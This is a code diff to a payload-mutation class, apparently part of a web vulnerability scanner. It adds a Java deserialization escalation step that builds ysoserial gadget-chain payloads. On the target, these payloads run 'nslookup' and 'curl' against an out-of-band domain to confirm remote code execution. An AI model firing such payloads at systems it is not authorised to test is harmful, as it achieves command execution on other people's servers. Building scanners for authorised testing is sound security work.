@@ -52,7 +52,7 @@ class PayloadMutation:
         if self.probe == "ysoserial":
             return self._mutate_java()
         if self.probe == "urldns_probe":
-            return self._mutate_java_urldns()
+            return self._mutate_java_urldns() + self._mutate_java_rce_escalation()
         if self.probe in ("gadget_chain", "magic_method"):
             return self._php_mutation()
         if self.probe in ("flip_boolean", "modify_string","modify_integer"):
@@ -198,7 +198,36 @@ class PayloadMutation:
             return [payload]
 
         return []
-    
+
+    RCE_ESCALATION_OOB_COMMANDS = [
+        "nslookup {domain}",
+        "curl http://{domain}/cc-rce-confirmed",
+    ]
+
+    def _mutate_java_rce_escalation(self) -> Mutations:
+        if not os.path.exists(self.YSOSERIAL_PATH):
+            return []
+
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return []
+
+        results: Mutations = []
+        for chain in self._resolve_chains():
+            for cmd_template in self.RCE_ESCALATION_OOB_COMMANDS:
+                command = cmd_template.format(domain=oob_domain)
+                b64 = self._run_ysoserial(chain, command)
+                if b64:
+                    payload = self._make_payload("java_rce_escalation", chain, command, b64)
+                    payload["note"] = (
+                        f"Escalated from unconfirmed Java deserialization (no specific gadget keyword "
+                        f"matched) — check {oob_domain}'s interaction log for an inbound DNS/HTTP "
+                        "callback to confirm this gadget chain actually executed on the target"
+                    )
+                    results.append(payload)
+
+        return results
+
     
     
     PHPGGC_PATH = get_tool_path("phpggc")
